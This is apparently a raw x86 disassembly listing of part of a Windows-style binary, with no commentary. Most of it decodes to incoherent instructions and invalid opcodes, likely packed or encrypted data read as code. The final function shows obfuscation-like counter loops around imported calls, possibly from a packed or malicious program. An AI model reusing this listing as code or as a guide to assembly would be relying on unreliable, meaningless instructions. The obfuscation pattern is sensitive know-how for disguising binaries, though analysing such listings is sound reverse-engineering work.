  40ba18:	and    eax,0xbcc4a0cf
  40ba1d:	mov    bl,0xb3
  40ba1f:	ror    DWORD PTR [edi+0x6b],1
  40ba22:	xchg   ebx,eax
  40ba23:	xor    bh,ch
  40ba25:	adc    dl,BYTE PTR [eax-0x5e]
  40ba28:	mov    eax,DWORD PTR [ebp-0x8]
  40ba2b:	mov    ecx,DWORD PTR [ebp-0x18]
  40ba2e:	jmp    0x40bd4f
  40ba33:	xchg   esp,eax
  40ba34:	jge    0x40ba82
  40ba36:	hlt    
  40ba37:	push   ebp
  40ba38:	jne    0x40b9ee
  40ba3a:	pop    ebp
  40ba3b:	cld    
  40ba3c:	into   
  40ba3d:	inc    edx
  40ba3e:	cmp    dh,BYTE PTR [edi-0x68]
  40ba41:	pop    esp
  40ba42:	xchg   edi,eax
  40ba43:	adc    BYTE PTR [edi+0x7d7a7e7e],al
  40ba49:	jle    0x40bac9
  40ba4b:	add    DWORD PTR [eax+0x217dc952],esp
  40ba51:	inc    esi
  40ba52:	dec    esi
  40ba53:	mov    BYTE PTR [edi-0x1c],al
  40ba56:	test   al,0x3b
  40ba58:	cmp    al,0x1a
  40ba5a:	lods   al,BYTE PTR ds:[esi]
  40ba5b:	mov    ecx,0xf106104b
  40ba60:	dec    eax
  40ba61:	inc    esp
  40ba62:	cmp    DWORD PTR [edi+0x52],ebx
  40ba65:	pop    esp
  40ba66:	lods   al,BYTE PTR ds:[esi]
  40ba67:	add    al,0x9f
  40ba69:	push   0x3d
  40ba6b:	jns    0x40ba27
  40ba6d:	and    ebx,edi
  40ba6f:	jmp    0xe66369fb
  40ba74:	jmp    0x40ba77
  40ba76:	mov    eax,ds:0x6de8b773
  40ba7b:	push   es
  40ba7c:	lahf   
  40ba7d:	xor    ch,BYTE PTR [ebx-0x4f5fa283]
  40ba83:	test   al,0xe7
  40ba85:	or     esi,DWORD PTR [esi+0x49]
  40ba88:	imul   edi,DWORD PTR [esi+0x7381b051],0xffffff9a
  40ba8f:	out    dx,eax
  40ba90:	mov    dh,0x2c
  40ba92:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba94:	adc    edi,esp
  40ba96:	mov    dh,0xce
  40ba98:	cmp    bl,BYTE PTR [edx+0x32]
  40ba9b:	inc    si
  40ba9d:	ja     0x40ba9c
  40ba9f:	jmp    0x40bacc
  40baa1:	sbb    bh,BYTE PTR [ebp-0x5004da5a]
  40baa7:	dec    ebx
  40baa8:	jmp    0x8e4e9196
  40baad:	pushf  
  40baae:	inc    esi
  40baaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bab0:	out    0xdc,eax
  40bab2:	or     DWORD PTR [edx],edi
  40bab4:	pop    ds
  40bab5:	stos   BYTE PTR es:[edi],al
  40bab6:	jmp    DWORD PTR [ecx+0x3f]
  40bab9:	daa    
  40baba:	packuswb mm5,mm5
  40babd:	enter  0xc058,0xec
  40bac1:	lods   eax,DWORD PTR ds:[esi]
  40bac2:	and    edx,DWORD PTR [edi+0x17]
  40bac5:	vpmulhw ymm4,ymm3,ymm4
  40bac9:	cs adc ch,cl
  40bacc:	loop   0x40bab2
  40bace:	fcmovnbe st,st(3)
  40bad0:	pusha  
  40bad1:	inc    esi
  40bad2:	clc    
  40bad3:	inc    ecx
  40bad4:	fnstcw WORD PTR [edx]
  40bad6:	inc    edi
  40bad7:	or     eax,0xe487f0cc
  40badc:	sti    
  40badd:	cmp    al,0x1d
  40badf:	add    BYTE PTR es:[esi-0x12c53237],ah
  40bae6:	fst    DWORD PTR [edi+edi*8-0x2d]
  40baea:	xchg   esi,eax
  40baeb:	xchg   ebp,eax
  40baec:	lock add ch,BYTE PTR [ecx]
  40baef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40baf0:	cmp    BYTE PTR [edi-0x4],dl
  40baf3:	pop    esp
  40baf4:	pop    ecx
  40baf5:	dec    ebp
  40baf6:	out    dx,al
  40baf7:	and    ch,0xab
  40bafa:	lock fstp st(0)
  40bafd:	in     al,dx
  40bafe:	inc    edi
  40baff:	shl    BYTE PTR [ecx],0x52
  40bb02:	movhps QWORD PTR [ecx-0x19a1f02],xmm1
  40bb09:	inc    edx
  40bb0a:	mov    ds:0x597e1611,eax
  40bb0f:	inc    edx
  40bb10:	push   edi
  40bb11:	mov    ds:0xe5cab4a,eax
  40bb16:	mov    dh,0x1
  40bb18:	xchg   ebx,eax
  40bb19:	icebp  
  40bb1a:	hlt    
  40bb1b:	sbb    dh,cl
  40bb1d:	xor    eax,0x60bb5733
  40bb22:	push   0xeae1911b
  40bb27:	push   edx
  40bb28:	jmp    0x92e85f16
  40bb2d:	mov    ds:0xb2945ab2,eax
  40bb32:	mov    ecx,0xbe204f7d
  40bb37:	test   DWORD PTR ds:0x46ca493b,ecx
  40bb3d:	in     al,0xcd
  40bb3f:	pop    ecx
  40bb40:	jmp    0x40bb59
  40bb42:	hlt    
  40bb43:	add    dl,al
  40bb45:	pop    eax
  40bb46:	scas   eax,DWORD PTR es:[edi]
  40bb47:	pop    esp
  40bb48:	push   es
  40bb49:	sbb    ch,al
  40bb4b:	rol    BYTE PTR [eiz*4+0x52d23a85],cl
  40bb52:	(bad)  
  40bb53:	ds pop ss
  40bb55:	sti    
  40bb56:	shr    ebp,cl
  40bb58:	xor    eax,0x5cdd8ec8
  40bb5d:	mov    dh,0xb0
  40bb5f:	nop
  40bb60:	cmp    ecx,edi
  40bb62:	jne    0x40bbad
  40bb64:	mov    esi,0x7b864bb
  40bb69:	ret    0xe67a
  40bb6c:	mov    al,0x20
  40bb6e:	rcl    bh,cl
  40bb70:	xchg   edi,eax
  40bb71:	xor    cl,BYTE PTR [ecx+ebx*8]
  40bb74:	sbb    al,BYTE PTR [eax-0x3a565619]
  40bb7a:	cdq    
  40bb7b:	daa    
  40bb7c:	popa   
  40bb7d:	xor    ebp,DWORD PTR [esi]
  40bb7f:	(bad)  
  40bb80:	mov    eax,ds:0x6fb40c4b
  40bb85:	das    
  40bb86:	test   al,0xfc
  40bb88:	sbb    al,0x57
  40bb8a:	retf   0x8ad2
  40bb8d:	scas   al,BYTE PTR es:[edi]
  40bb8e:	fucom  st(7)
  40bb90:	scas   eax,DWORD PTR es:[edi]
  40bb91:	push   edx
  40bb92:	out    dx,al
  40bb93:	nop
  40bb94:	sub    eax,0xa6a72d02
  40bb99:	mov    dh,ch
  40bb9b:	sbb    eax,0xe9ed795
  40bba0:	jg     0x40bb27
  40bba2:	xor    BYTE PTR [ecx+0x26870bfc],0xa1
  40bba9:	pop    esp
  40bbaa:	fs adc al,0x64
  40bbad:	push   ss
  40bbae:	fild   QWORD PTR [eax+edi*4+0x444cccc0]
  40bbb5:	push   0xffffffc6
  40bbb7:	pop    edi
  40bbb8:	add    BYTE PTR gs:[eax-0x14cc3949],ah
  40bbbf:	inc    esi
  40bbc0:	icebp  
  40bbc1:	or     bl,BYTE PTR [ebp-0x64]
  40bbc4:	dec    edx
  40bbc5:	aas    
  40bbc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbc7:	push   esp
  40bbc8:	daa    
  40bbc9:	sti    
  40bbca:	sbb    BYTE PTR [ebx-0x15],cl
  40bbcd:	sbb    BYTE PTR [edi-0x8],dl
  40bbd0:	or     DWORD PTR ds:0x932f61ef,edi
  40bbd6:	loopne 0x40bbdb
  40bbd8:	mov    ds:0x86d49fa9,al
  40bbdd:	(bad)  
  40bbde:	jg     0x40bc37
  40bbe0:	inc    esi
  40bbe1:	mov    WORD PTR [esi-0x73],gs
  40bbe4:	imul   esp,DWORD PTR fs:[ebp+0x79],0xfb7e094e
  40bbec:	xlat   BYTE PTR ds:[ebx]
  40bbed:	and    DWORD PTR [esp+ecx*1-0x5b28246e],esp
  40bbf4:	outs   dx,DWORD PTR ds:[esi]
  40bbf5:	iret   
  40bbf6:	jecxz  0x40bb78
  40bbf8:	retf   
  40bbf9:	push   eax
  40bbfa:	mov    ah,0x10
  40bbfc:	or     ebx,DWORD PTR [ebp-0x1f77b0b1]
  40bc02:	addr16 xchg ebp,eax
  40bc04:	cli    
  40bc05:	and    eax,0x6828f40a
  40bc0a:	es aaa 
  40bc0c:	mov    ebp,cs
  40bc0e:	adc    al,0x20
  40bc10:	and    al,0xcf
  40bc12:	adc    cl,BYTE PTR [bp+si+0x76]
  40bc16:	push   ds
  40bc17:	cmc    
  40bc18:	xor    al,0xbe
  40bc1a:	sbb    ax,WORD PTR [eax+0x2af0fe48]
  40bc21:	pop    edx
  40bc22:	mov    dl,0xfe
  40bc24:	cmc    
  40bc25:	sbb    ecx,esp
  40bc27:	adc    DWORD PTR [edx],eax
  40bc29:	pusha  
  40bc2a:	jno    0x40bc5b
  40bc2c:	sub    al,0xb
  40bc2e:	adc    ecx,DWORD PTR [eax-0x6c3453bb]
  40bc34:	pop    edx
  40bc35:	into   
  40bc36:	out    0x36,eax
  40bc38:	arpl   WORD PTR [eax+edx*4+0x2fc9d2ae],cx
  40bc3f:	bswap  ecx
  40bc41:	pop    ss
  40bc42:	sub    dh,ah
  40bc44:	jp     0x40bc03
  40bc46:	in     eax,0x16
  40bc48:	pop    edi
  40bc49:	stos   DWORD PTR es:[edi],eax
  40bc4a:	popa   
  40bc4b:	int    0x42
  40bc4d:	cmp    edi,DWORD PTR [edx]
  40bc4f:	ins    DWORD PTR es:[edi],dx
  40bc50:	pop    edi
  40bc51:	ja     0x40bc03
  40bc53:	pop    ecx
  40bc54:	xlat   BYTE PTR ds:[ebx]
  40bc55:	xlat   BYTE PTR ds:[ebx]
  40bc56:	out    dx,eax
  40bc57:	mov    ebx,0xe2c52eb8
  40bc5c:	retf   0x74bb
  40bc5f:	inc    ebx
  40bc60:	lods   al,BYTE PTR ds:[esi]
  40bc61:	add    eax,0x9fa6bdb5
  40bc66:	sbb    DWORD PTR [ebx],esp
  40bc68:	xchg   esp,eax
  40bc69:	xor    edx,DWORD PTR [edi+0x2f7a517]
  40bc6f:	sbb    eax,DWORD PTR [edi-0x7713ce62]
  40bc75:	pop    eax
  40bc76:	call   0x2b5dcb96
  40bc7b:	cli    
  40bc7c:	pop    ebx
  40bc7d:	jge    0x40bc0e
  40bc7f:	das    
  40bc80:	push   cs
  40bc81:	push   0xdaa7b8d0
  40bc86:	dec    esp
  40bc87:	sbb    eax,0xbbee846e
  40bc8c:	jmp    0x57fbe622
  40bc91:	inc    ecx
  40bc92:	aam    0xdd
  40bc94:	cmp    edi,DWORD PTR [ecx]
  40bc96:	sbb    al,0x8e
  40bc98:	in     eax,0xbe
  40bc9a:	push   eax
  40bc9b:	mov    edi,0xde2c1d3c
  40bca0:	loope  0x40bc3d
  40bca2:	sub    al,0xe8
  40bca4:	sub    BYTE PTR [ebx-0x2ecf7683],0x89
  40bcab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcac:	aad    0xf7
  40bcae:	push   es
  40bcaf:	fidivr DWORD PTR ds:[esi]
  40bcb2:	jge    0x40bc59
  40bcb4:	pop    es
  40bcb5:	mov    al,ds:0xb18765ec
  40bcba:	icebp  
  40bcbb:	and    eax,0xe3e45341
  40bcc0:	sbb    BYTE PTR [esi-0x24],0xbf
  40bcc4:	je     0x40bcc8
  40bcc6:	xchg   ecx,eax
  40bcc7:	xchg   cl,bl
  40bcc9:	stc    
  40bcca:	popa   
  40bccb:	xchg   edx,eax
  40bccc:	retf   0x3c2c
  40bccf:	mov    cl,0xb8
  40bcd1:	xor    DWORD PTR [edx+0x34],0xfffffff9
  40bcd5:	ret    0xdf6c
  40bcd8:	rcl    DWORD PTR [esi],1
  40bcda:	push   edi
  40bcdb:	mov    edi,0x27e9c0cd
  40bce0:	mov    eax,ds:0xb21b5bef
  40bce5:	xchg   ebp,eax
  40bce6:	or     eax,0xad9bdf98
  40bceb:	dec    eax
  40bcec:	push   ds
  40bced:	lds    ecx,FWORD PTR [ebp-0x53818e29]
  40bcf3:	cmp    DWORD PTR [eax-0x4b6be09c],esi
  40bcf9:	jne    0x40bc94
  40bcfb:	mov    ?,WORD PTR [ebp+0x41e58f96]
  40bd01:	aas    
  40bd02:	pop    eax
  40bd03:	add    BYTE PTR [edx+eax*4],dl
  40bd06:	xchg   esi,eax
  40bd07:	(bad)  
  40bd08:	(bad)
  40bd0c:	int3   
  40bd0d:	xchg   esi,eax
  40bd0e:	cmp    esi,DWORD PTR [ebx+0x138eb08d]
  40bd14:	rol    dl,1
  40bd16:	jge    0x40bd00
  40bd18:	hlt    
  40bd19:	or     eax,DWORD PTR [ebp-0x572c4deb]
  40bd1f:	(bad)  
  40bd20:	or     eax,0xcd62d584
  40bd25:	xchg   ecx,eax
  40bd26:	bound  esp,QWORD PTR [esi-0x5a4b2478]
  40bd2c:	outs   dx,DWORD PTR ds:[esi]
  40bd2d:	jns    0x40bd7c
  40bd2f:	call   0xd80f:0x4371af3c
  40bd36:	aas    
  40bd37:	fild   DWORD PTR [eax]
  40bd39:	mov    eax,ds:0xc4f766f8
  40bd3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd3f:	or     DWORD PTR [eax-0x542c5355],edx
  40bd45:	stos   BYTE PTR es:[edi],al
  40bd46:	pop    eax
  40bd47:	clc    
  40bd48:	fidiv  DWORD PTR [ebp+0x24]
  40bd4b:	inc    ebp
  40bd4c:	cmp    ah,BYTE PTR [ebx-0x76f674f4]
  40bd52:	or     cl,ch
  40bd54:	sbb    al,0x3
  40bd56:	add    BYTE PTR [eax],al
  40bd58:	out    0x4c,al
  40bd5a:	xor    al,0x30
  40bd5c:	mov    ah,0x70
  40bd5e:	loop   0x40bda8
  40bd60:	into   
  40bd61:	xor    BYTE PTR [ecx],bl
  40bd63:	xchg   esp,eax
  40bd64:	xchg   DWORD PTR [ebp+eiz*8+0x7e821c72],eax
  40bd6b:	jle    0x40bde7
  40bd6d:	jge    0x40bded
  40bd6f:	jle    0x40bd12
  40bd71:	scas   al,BYTE PTR es:[edi]
  40bd72:	mov    bh,0xb0
  40bd74:	mov    dh,0xa
  40bd76:	pop    ecx
  40bd77:	adc    al,0x60
  40bd79:	cmc    
  40bd7a:	ja     0x40bd81
  40bd7c:	ss aas 
  40bd7e:	hlt    
  40bd7f:	sub    eax,0xa1c3f640
  40bd84:	pop    edi
  40bd85:	stc    
  40bd86:	fstp   DWORD PTR [eax+0x33]
  40bd89:	imul   eax,DWORD PTR [esp+eax*2+0x18],0x198af026
  40bd91:	and    al,ch
  40bd93:	pop    edx
  40bd94:	push   edi
  40bd95:	and    al,0xd5
  40bd97:	adc    cl,BYTE PTR es:[esi-0x709a5084]
  40bd9e:	(bad)
  40bda2:	out    0x6e,al
  40bda4:	bound  ebp,QWORD PTR ds:0x66be4e5d
  40bdaa:	xor    BYTE PTR [esi],cl
  40bdac:	sbb    DWORD PTR [edi-0x4c8857ed],eax
  40bdb2:	jbe    0x40bdfc
  40bdb4:	fisubr DWORD PTR [ebx-0x72eaa56c]
  40bdba:	mov    ah,0x8e
  40bdbc:	out    0x3c,eax
  40bdbe:	sub    BYTE PTR [edi-0x64],al
  40bdc1:	repnz (bad) 
  40bdc3:	xor    al,0x3f
  40bdc5:	mov    ecx,0x25a091e4
  40bdca:	push   eax
  40bdcb:	loop   0x40bd80
  40bdcd:	sub    dh,dh
  40bdcf:	fmul   st(1),st
  40bdd1:	cs clc 
  40bdd3:	mov    ebp,0x63900d24
  40bdd8:	ret    
  40bdd9:	sub    BYTE PTR [edx],al
  40bddb:	mov    esi,DWORD PTR [edx+0x26]
  40bdde:	test   DWORD PTR [ebx],edx
  40bde0:	call   0x172b0252
  40bde5:	jle    0x40be05
  40bde7:	fwait
  40bde8:	daa    
  40bde9:	push   es
  40bdea:	adc    BYTE PTR [ecx+0x3],ch
  40bded:	daa    
  40bdee:	ficom  DWORD PTR [ebx-0x26668dd2]
  40bdf4:	inc    edi
  40bdf5:	dec    esp
  40bdf6:	adc    al,0xcc
  40bdf8:	push   edi
  40bdf9:	xchg   ecx,eax
  40bdfa:	xchg   ebp,eax
  40bdfb:	xchg   esp,eax
  40bdfc:	jno    0x40be33
  40bdfe:	enter  0x6077,0xbd
  40be02:	inc    BYTE PTR ds:0xf5c40ccf
  40be08:	mov    bh,0x10
  40be0a:	in     al,0x5
  40be0c:	cwde   
  40be0d:	or     ch,0x7c
  40be10:	popa   
  40be11:	sub    eax,0x39cf720a
  40be16:	pushf  
  40be17:	push   0x8
  40be19:	ins    DWORD PTR es:[edi],dx
  40be1a:	mov    dh,0xac
  40be1c:	mov    WORD PTR [eax],ds
  40be1e:	stos   BYTE PTR es:[edi],al
  40be1f:	push   esi
  40be20:	adc    bl,ch
  40be22:	sti    
  40be23:	inc    al
  40be25:	retf   
  40be26:	dec    esp
  40be27:	sti    
  40be28:	sbb    DWORD PTR [esi+edx*2-0x1609170e],edi
  40be2f:	and    ebx,esp
  40be31:	cmp    al,0x5f
  40be33:	loope  0x40bdd1
  40be35:	je     0x40be89
  40be37:	fwait
  40be38:	inc    ecx
  40be39:	pop    ds
  40be3a:	sbb    eax,0xc989f03e
  40be3f:	push   edi
  40be40:	add    al,cl
  40be42:	sub    DWORD PTR [ebx],edi
  40be44:	sub    DWORD PTR [esi-0x11a94b18],ebp
  40be4a:	xor    ah,BYTE PTR [edi]
  40be4c:	dec    edx
  40be4d:	dec    DWORD PTR [ecx-0x44e8b3e4]
  40be53:	lock test eax,0xb8f4cf20
  40be59:	sbb    esi,DWORD PTR [eax-0x45]
  40be5c:	xchg   edx,eax
  40be5d:	(bad)  
  40be5e:	aaa    
  40be5f:	dec    edx
  40be60:	adc    dl,bl
  40be62:	lods   al,BYTE PTR ds:[esi]
  40be63:	mov    dh,0xff
  40be65:	pop    ebx
  40be66:	std    
  40be67:	(bad)  
  40be68:	jge    0x40be33
  40be6a:	push   esp
  40be6b:	(bad)  
  40be6c:	xlat   BYTE PTR ds:[ebx]
  40be6d:	nop
  40be6e:	mov    bl,0x6f
  40be70:	jbe    0x40be7e
  40be72:	test   BYTE PTR [esi-0x4ee9f1fb],bl
  40be78:	inc    ebp
  40be79:	pop    ebx
  40be7a:	jbe    0x40be5b
  40be7c:	jecxz  0x40be8f
  40be7e:	shl    DWORD PTR [eax+0x36],1
  40be81:	pop    ds
  40be82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be83:	test   DWORD PTR [edx],ebx
  40be85:	iret   
  40be86:	or     al,0xaa
  40be88:	pop    edi
  40be89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be8a:	vaddsubps xmm4,xmm6,XMMWORD PTR [ebp-0xc]
  40be8f:	sbb    eax,0x8b7d77ac
  40be94:	cmp    al,0xbc
  40be96:	imul   eax,edx,0xcb7e2bb0
  40be9c:	nop
  40be9d:	shl    BYTE PTR [ecx-0x7d],0x34
  40bea1:	pop    ds
  40bea2:	jae    0x40be30
  40bea4:	lea    esp,[eax+eax*4+0x1a]
  40bea8:	ins    BYTE PTR es:[edi],dx
  40bea9:	jns    0x40be60
  40beab:	sbb    BYTE PTR [edi*1+0x562527d7],0x50
  40beb3:	mov    ?,WORD PTR [ebp+0x14]
  40beb6:	clc    
  40beb7:	pop    ebx
  40beb8:	lods   al,BYTE PTR ds:[esi]
  40beb9:	mov    eax,0xe97ce3e0
  40bebe:	push   0x50
  40bec0:	jmp    0x6a7d:0x25b30c63
  40bec7:	fwait
  40bec8:	cmp    esi,DWORD PTR [esp+edx*8]
  40becb:	gs icebp 
  40becd:	jnp    0x40be8a
  40becf:	or     al,0xd0
  40bed1:	cmp    ecx,DWORD PTR [ecx]
  40bed3:	(bad)  [edi+edi*8]
  40bed6:	hlt    
  40bed7:	mov    bl,0x9e
  40bed9:	rol    DWORD PTR [ebp+esi*8+0x42],cl
  40bedd:	pop    ss
  40bede:	lds    esp,FWORD PTR [esp+esi*4-0x7099973]
  40bee5:	stos   DWORD PTR es:[edi],eax
  40bee6:	ret    0xd93d
  40bee9:	xchg   DWORD PTR [edi+esi*1-0xb1d165c],esi
  40bef0:	retf   
  40bef1:	and    eax,0x5d146661
  40bef6:	adc    DWORD PTR [edx-0x5a],ecx
  40bef9:	cmp    eax,0xdd4a80ac
  40befe:	imul   eax,DWORD PTR [edx-0x24],0xffffff90
  40bf02:	ficom  DWORD PTR [eax+0x336f21e]
  40bf08:	jbe    0x40bec9
  40bf0a:	test   eax,0x68eb5982
  40bf0f:	(bad)  
  40bf10:	mov    edx,0x8e20d5a8
  40bf15:	adc    ecx,0xffffffe6
  40bf18:	gs jmp 0xa2738fce
  40bf1e:	sub    bl,bl
  40bf20:	sbb    BYTE PTR ds:[ebx+esi*1-0x40e0b379],cl
  40bf28:	and    eax,0x88bd1142
  40bf2d:	xor    eax,eax
  40bf2f:	or     DWORD PTR [ecx],edx
  40bf31:	xor    BYTE PTR [eax],bh
  40bf33:	xchg   BYTE PTR [edi-0x4f9904bd],ah
  40bf39:	out    dx,al
  40bf3a:	sbb    eax,0xbb73735f
  40bf3f:	aad    0x2d
  40bf41:	inc    ebp
  40bf42:	mov    ah,0x2d
  40bf44:	fldenv [edx-0xd]
  40bf47:	push   ecx
  40bf48:	xlat   BYTE PTR ds:[ebx]
  40bf49:	rsm    
  40bf4b:	adc    eax,0x7e1281ea
  40bf50:	xchg   ebx,eax
  40bf51:	cvtpi2ps xmm0,QWORD PTR [esi+0x7b78e85f]
  40bf58:	push   ecx
  40bf59:	out    0x7c,al
  40bf5b:	test   BYTE PTR [edx-0x61],dl
  40bf5e:	out    dx,eax
  40bf5f:	sbb    al,BYTE PTR [ebx]
  40bf61:	sbb    dl,BYTE PTR [esi+0x1879b2bc]
  40bf67:	mov    ebx,0xedf160ed
  40bf6c:	and    BYTE PTR [edi-0x1],cl
  40bf6f:	or     dl,bl
  40bf71:	push   ebx
  40bf72:	int3   
  40bf73:	stc    
  40bf74:	scas   al,BYTE PTR es:[edi]
  40bf75:	icebp  
  40bf76:	push   ebp
  40bf77:	rcl    edi,0xb6
  40bf7a:	lahf   
  40bf7b:	mov    eax,ds:0x6d996947
  40bf80:	cld    
  40bf81:	pop    ss
  40bf82:	add    eax,0xcf02910b
  40bf87:	call   0x15ba55f2
  40bf8c:	cmp    al,0x8f
  40bf8e:	scas   al,BYTE PTR es:[edi]
  40bf8f:	test   ch,dl
  40bf91:	cmp    edx,DWORD PTR [ebp+0x391ae469]
  40bf97:	jge    0x40bfae
  40bf99:	sar    BYTE PTR ds:0x280529f3,cl
  40bf9f:	mov    ds:0x8946717d,al
  40bfa4:	stos   DWORD PTR es:[edi],eax
  40bfa5:	mov    eax,0xddb491
  40bfaa:	frstor [eax+0x7a21beba]
  40bfb0:	mov    esi,DWORD PTR [edx-0xd]
  40bfb3:	jns    0x40bfa6
  40bfb5:	adc    bh,BYTE PTR [edi+ebp*1-0x17]
  40bfb9:	sbb    DWORD PTR [edi+0x5b],ebp
  40bfbc:	pop    ss
  40bfbd:	cld    
  40bfbe:	xchg   ebp,eax
  40bfbf:	loope  0x40c012
  40bfc1:	cdq    
  40bfc2:	mov    eax,DWORD PTR [ebp-0x57]
  40bfc5:	push   0xffffffe8
  40bfc7:	fldl2e 
  40bfc9:	cmp    ebx,esi
  40bfcb:	les    esi,FWORD PTR [ebp+0x60]
  40bfce:	(bad)  
  40bfcf:	pop    ecx
  40bfd0:	push   esi
  40bfd1:	push   cs
  40bfd2:	leave  
  40bfd3:	add    ah,cl
  40bfd5:	dec    edx
  40bfd6:	aam    0x20
  40bfd8:	es mov cl,0x61
  40bfdb:	clc    
  40bfdc:	xor    ah,ch
  40bfde:	loop   0x40bfea
  40bfe0:	mov    ebp,edi
  40bfe2:	idiv   DWORD PTR [ecx-0x6d5b660f]
  40bfe8:	sbb    ecx,DWORD PTR [edi]
  40bfea:	mov    edx,0x2598c87c
  40bfef:	mov    al,0x27
  40bff1:	jmp    0x40bfcd
  40bff3:	(bad)  
  40bff5:	scas   eax,DWORD PTR es:[edi]
  40bff6:	aaa    
  40bff7:	and    edx,DWORD PTR [eax-0x1]
  40bffa:	das    
  40bffb:	dec    esi
  40bffc:	(bad)  
  40bffd:	sti    
  40bffe:	inc    edi
  40bfff:	pusha  
  40c000:	add    BYTE PTR [edi+0x40ac264a],al
  40c006:	xchg   edx,eax
  40c007:	mov    ecx,0x77e9c14
  40c00c:	inc    ebp
  40c00d:	xchg   esp,eax
  40c00e:	adc    BYTE PTR [ecx],dh
  40c010:	lea    esp,[ebx-0x4fcf8a57]
  40c016:	pop    es
  40c017:	xor    edi,edx
  40c019:	mov    bl,0x18
  40c01b:	cwde   
  40c01c:	loope  0x40c075
  40c01e:	mov    esp,0x2b435306
  40c023:	mov    cl,0xa1
  40c025:	and    DWORD PTR [ecx],0x1640fa6f
  40c02b:	lock jle 0x40c022
  40c02e:	fcmovnu st,st(2)
  40c030:	mov    eax,0x91928868
  40c035:	imul   ebx,DWORD PTR [edx-0x366c96d7],0x2dd1fab
  40c03f:	inc    edx
  40c040:	(bad)  [esp+esi*1-0x30463f78]
  40c047:	sahf   
  40c048:	int    0x5
  40c04a:	or     ah,bh
  40c04c:	imul   ebx,DWORD PTR [ecx],0x66c1d122
  40c052:	push   edx
  40c053:	push   esi
  40c054:	jmp    0xae6b:0x5b5404d0
  40c05b:	jno    0x40c037
  40c05d:	data16 std 
  40c05f:	xor    DWORD PTR ds:0xd9e4fbcf,eax
  40c065:	repnz or DWORD PTR [edx+0x5],ebp
  40c069:	xor    DWORD PTR [ecx],ebx
  40c06b:	xchg   BYTE PTR [eax-0x29],al
  40c06e:	clc    
  40c06f:	mul    DWORD PTR [ecx]
  40c071:	pop    ebp
  40c072:	xor    al,0x4d
  40c074:	mov    eax,DWORD PTR [ebp+0xc]
  40c077:	mov    eax,DWORD PTR [ebp+0x8]
  40c07a:	push   DWORD PTR [ebp-0x8]
  40c07d:	call   0x40746a
  40c082:	mov    eax,DWORD PTR [ebp-0xc]
  40c085:	cmp    eax,ebx
  40c087:	je     0x4098f8
  40c08d:	mov    eax,DWORD PTR [ebp-0x8]
  40c090:	mov    eax,DWORD PTR [eax]
  40c092:	pop    edi
  40c093:	pop    esi
  40c094:	pop    ebx
  40c095:	leave  
  40c096:	ret    0xc
  40c099:	push   ebp
  40c09a:	mov    ebp,esp
  40c09c:	sub    esp,0x30
  40c09f:	adc    DWORD PTR ds:0x433717,ecx
  40c0a5:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40c0ac:	xor    ecx,ecx
  40c0ae:	or     ecx,DWORD PTR ds:0x433727
  40c0b4:	and    DWORD PTR ds:0x433783,ecx
  40c0ba:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40c0c1:	mov    ecx,DWORD PTR [ebp-0x4]
  40c0c4:	mov    DWORD PTR ds:0x4337b7,0x13
  40c0ce:	cmp    DWORD PTR ds:0x4337b7,0x0
  40c0d5:	je     0x40c103
  40c0db:	cmp    DWORD PTR ds:0x4337b7,0x1a
  40c0e2:	jne    0x40c0f3
  40c0e8:	push   0x1b76
  40c0ed:	call   DWORD PTR ds:0x412020
  40c0f3:	mov    eax,ds:0x4337b7
  40c0f8:	dec    eax
  40c0f9:	mov    ds:0x4337b7,eax
  40c0fe:	jmp    0x40c0ce
  40c103:	push   ebx
  40c104:	mov    DWORD PTR ds:0x4337e7,0x19
  40c10e:	cmp    DWORD PTR ds:0x4337e7,0x0
  40c115:	je     0x40c1bf
  40c11b:	cmp    DWORD PTR ds:0x4337e7,0xa
  40c122:	jne    0x40c133
  40c128:	push   0x4904
  40c12d:	call   DWORD PTR ds:0x412024
  40c133:	cmp    DWORD PTR ds:0x4337e7,0xb
  40c13a:	jne    0x40c14d
  40c140:	mov    ebx,DWORD PTR ds:0x4337e7
  40c146:	dec    ebx
  40c147:	mov    DWORD PTR ds:0x4337e7,ebx
  40c14d:	mov    ebx,DWORD PTR ds:0x4337e7
  40c153:	dec    ebx
  40c154:	mov    DWORD PTR ds:0x4337e7,ebx
  40c15a:	jmp    0x40c10e
  40c15f:	mov    DWORD PTR ds:0x433783,0x1d
  40c169:	cmp    DWORD PTR ds:0x433783,0x0
  40c170:	je     0x40c1bf
  40c176:	cmp    DWORD PTR ds:0x433783,0x3
  40c17d:	jne    0x40c193
  40c183:	push   0x433880
  40c188:	push   0x400000
  40c18d:	call   DWORD PTR ds:0x412028
  40c193:	cmp    DWORD PTR ds:0x433783,0x4
  40c19a:	jne    0x40c1ad
  40c1a0:	mov    ebx,DWORD PTR ds:0x433783
  40c1a6:	dec    ebx
  40c1a7:	mov    DWORD PTR ds:0x433783,ebx
  40c1ad:	mov    ebx,DWORD PTR ds:0x433783
  40c1b3:	dec    ebx
  40c1b4:	mov    DWORD PTR ds:0x433783,ebx
  40c1ba:	jmp    0x40c169
  40c1bf:	mov    eax,0x7510854
  40c1c4:	adc    ebx,DWORD PTR ds:0x4337ab
  40c1ca:	xor    ecx,eax
  40c1cc:	mov    ebx,0x32729b
  40c1d1:	add    ecx,ebx
  40c1d3:	mov    DWORD PTR [ebp-0x1c],ecx
  40c1d6:	movzx  ecx,BYTE PTR ds:0x4337b7
  40c1dd:	xor    DWORD PTR ds:0x433713,ecx
  40c1e3:	mov    ecx,DWORD PTR [ebp+0x14]
  40c1e6:	or     DWORD PTR ds:0x43371b,0x43377b
  40c1f0:	push   esi
  40c1f1:	push   edi
  40c1f2:	test   ecx,ecx
  40c1f4:	mov    DWORD PTR ds:0x43372b,0x6070
  40c1fe:	je     0x40c2fb
  40c204:	mov    ecx,DWORD PTR [ebp+0x14]
  40c207:	mov    DWORD PTR ds:0x4337a7,0x1d
  40c211:	cmp    DWORD PTR ds:0x4337a7,0x0
  40c218:	je     0x40c2a6
  40c21e:	cmp    DWORD PTR ds:0x4337a7,0x29
